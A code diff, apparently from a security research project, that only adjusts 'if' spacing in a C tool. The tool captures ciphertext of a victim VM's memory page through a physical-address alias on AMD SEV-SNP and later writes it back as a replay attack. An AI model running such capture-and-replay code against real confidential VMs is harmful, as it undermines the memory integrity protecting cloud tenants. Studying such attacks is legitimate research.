@@ -32,7 +32,7 @@ int main(int argc, char** argv) {
     //
     // Parse args
     //
-    if(argc != 5) {
+    if (argc != 5) {
         printf("Params:  <qemu pid>  <path to alias definition csv> <{gpa2hpa_qemu,gpa2hpa_kern}><target victim gpa in hex>\n");
         printf("For SEV-SNP with memfd, only gpa2hpa_kern produces correct results\n");
         return 0;
@@ -84,13 +84,13 @@ int main(int argc, char** argv) {
     uint64_t hpa;
     switch(gpa2hpa_backend) {
         case GPA2HPA_KERN:
-            if(ioctl_gpa_to_hpa(victim_gpa, qemu_pid , &hpa )) {
+            if (ioctl_gpa_to_hpa(victim_gpa, qemu_pid , &hpa )) {
                 err_log("failed to translate gpa 0x%jx to hpa using kern backend\n", victim_gpa);
                 goto cleanup;
             }
         break;
         case GPA2HPA_QEMU:
-            if(qemu_gpa_to_hpa(victim_gpa, "127.0.0.1" , 4444 , &hpa )) {
+            if (qemu_gpa_to_hpa(victim_gpa, "127.0.0.1" , 4444 , &hpa )) {
                 err_log("failed to translate gpa 0x%jx to hpa using qemu backend\n", victim_gpa);
             }
         break;
@@ -128,13 +128,13 @@ int main(int argc, char** argv) {
     const size_t captured_cipher_len = 4096;
     uint8_t* captured_cipher = malloc(captured_cipher_len);
     
-    if(wbinvd_ac()) {
+    if (wbinvd_ac()) {
         err_log("wbinvd before capture failed\n");
         exit_code = EXIT_CODE_ERR;
         free(captured_cipher);
         goto cleanup;
     }
-    if(memcpy_frompa(captured_cipher, alias, captured_cipher_len, &stats, true )) {
+    if (memcpy_frompa(captured_cipher, alias, captured_cipher_len, &stats, true )) {
         err_log("failed to read from alias 0x%jx\n", alias);
         exit_code = EXIT_CODE_ERR;
         free(captured_cipher);
@@ -145,19 +145,19 @@ int main(int argc, char** argv) {
     getchar();
 
 
-    if(wbinvd_ac()) {
+    if (wbinvd_ac()) {
         err_log("wbinvd before replay failed\n");
         exit_code = EXIT_CODE_ERR;
         free(captured_cipher);
         goto cleanup;
     }
-    if(memcpy_topa(alias, captured_cipher, captured_cipher_len, &stats, true)) {
+    if (memcpy_topa(alias, captured_cipher, captured_cipher_len, &stats, true)) {
         err_log("failed to write to alias 0x%jx\n", alias);
         exit_code = EXIT_CODE_ERR;
         free(captured_cipher);
         goto cleanup;
     }
-    if(wbinvd_ac()) {
+    if (wbinvd_ac()) {
         err_log("wbinvd after replay failed\n");
         exit_code = EXIT_CODE_ERR;
         free(captured_cipher);
